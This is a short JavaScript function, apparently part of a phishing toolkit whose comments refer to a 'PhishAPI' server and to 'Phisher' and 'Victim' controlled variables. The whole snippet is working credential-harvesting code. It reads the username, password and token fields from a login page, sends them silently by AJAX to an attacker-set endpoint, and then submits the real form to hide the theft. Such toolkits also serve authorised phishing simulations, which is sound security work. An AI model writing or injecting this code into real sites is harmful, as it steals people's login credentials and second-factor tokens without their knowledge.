function SubForm(APIPortal,RedirectURL,FormName){
	// Phisher Controlled Variables
	var APIPortal = SubForm.arguments[0];
	var RedirectURL = SubForm.arguments[1];
	var FormName = SubForm.arguments[2];
	var SlackBotName = SubForm.arguments[3];
	var SlackBotEmoji = SubForm.arguments[4];
	// Vistim Controlled Variables
	var Username = document.getElementById("username").value;
	var Password = document.getElementById("password").value;
	var Token = document.getElementById("token");
    if(Token){
        var Token = Token.value;
    } else {
		Token = "";
	}

    $.ajax({
        // Post Transparent AJAX Request to PhishAPI Server
		url:APIPortal,
        type:'post',
		data:'username='+Username+'&password='+Password+'&token='+Token,
        success:function (){		
				// Submit Original Form
				var x = document.getElementsByName(FormName);
				x[0].submit();
        }
    });

}
